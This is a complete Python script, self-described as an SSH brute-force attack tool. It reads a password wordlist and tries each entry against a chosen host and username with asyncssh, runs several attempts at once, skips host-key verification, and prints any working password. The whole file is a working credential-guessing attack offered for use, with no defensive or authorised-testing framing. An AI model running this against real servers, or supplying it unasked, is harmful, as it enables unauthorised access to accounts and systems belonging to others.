import asyncio
import asyncssh
import argparse
from termcolor import colored
from datetime import datetime
from os import path
from sys import exit


def get_args():
    parser = argparse.ArgumentParser(description="SSH brute-force attack script.")
    parser.add_argument("--host", required=True)
    parser.add_argument('-u', '--username', dest='username', required=True)
    parser.add_argument("--password-file", required=True)
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()
    if args.dry_run:
        print("Dry run mode enabled. Options set:")
        print(f"Host: {args.host}\nUsername: {args.username}\nPassword file: {args.password_file}\nPort: {args.port}")
        return None
    return args


async def ssh_bruteforce(hostname, username, password, port, found_flag, result_holder):
    """Takes password, username, port as input and checks for connection"""
    if found_flag.is_set():
        return
    
    try:
        async with asyncssh.connect(hostname, username=username, password=password, port=port, known_hosts=None) as conn:
            found_flag.set()
            result_holder['password'] = password
            print(colored(
                f"[{port}] [ssh] host:{hostname}  login:{username}  password:{password}", 'green'))

    except asyncssh.PermissionDenied:
        if not found_flag.is_set():
            print(f"[Attempt] target {hostname} - login:{username} - password:{password}")
    
    except asyncssh.misc.HostKeyNotVerifiable as e:
        print(colored(f"[!] Host key verification failed: {e}", 'yellow'))
    
    except asyncssh.misc.DisconnectError as e:
        print(colored(f"[!] Disconnected by host: {e}", 'red'))
    
    except (asyncio.TimeoutError, OSError) as e:
        print(colored(f"[!] Connection error: {e}", 'red'))
    
    except Exception as err:
        if not found_flag.is_set():
            print(colored(f"[!] Unexpected error with password '{password}': {type(err).__name__} - {err}", 'red'))


async def main(hostname, port, username, password_file):
    """Main function - manages concurrent SSH attempts with proper async/await"""
    passwords = []
    found_flag = asyncio.Event()
    result_holder = {}
    concurrency_limit = 5
    
    with open(password_file, 'r') as f:
        passwords = [password.strip() for password in f.readlines()]

    # Create semaphore to limit concurrent connections
    semaphore = asyncio.Semaphore(concurrency_limit)

    async def bounded_bruteforce(password):
        async with semaphore:
            if not found_flag.is_set():
                await ssh_bruteforce(hostname, username, password, port, found_flag, result_holder)

    # Create all tasks
    tasks = [bounded_bruteforce(password) for password in passwords]
    
    # Run all tasks concurrently
    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        pass

    if found_flag.is_set():
        print(colored(f"\n[!] Password found: {result_holder.get('password')}\n", 'green'))
    else:
        print(colored("\n[-] Failed to find the correct password.", "red"))


if __name__ == "__main__":

    arguments = get_args()

    if arguments is None:
        exit(0)

    if not path.exists(arguments.password_file):
        print(colored(
            "[-] password_file location is not right,\n[-] Provide the right path of the password_file", 'red'))
        exit(1)

    print("\n---------------------------------------------------------\n---------------------------------------------------------")
    print(colored(f"[*] Host\t: ", "light_red",), end="")
    print(arguments.host)
    print(colored(f"[*] Username\t: ", "light_red",), end="")
    print(arguments.username)

    print(colored(
        f"[*] Port\t: ", "light_red"), end="")
    print(arguments.port)

    print(
        colored(f"[*] password_file\t: ", "light_red"), end="")
    print(arguments.password_file)

    print(colored(f"[*] Protocol\t: ", "light_red"), end="")
    print("SSH")

    print("---------------------------------------------------------\n---------------------------------------------------------", )

    print(colored(
        f"SSH-Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
    print("---------------------------------------------------------\n---------------------------------------------------------")

    asyncio.run(main(arguments.host, arguments.port,
                arguments.username, arguments.password_file))
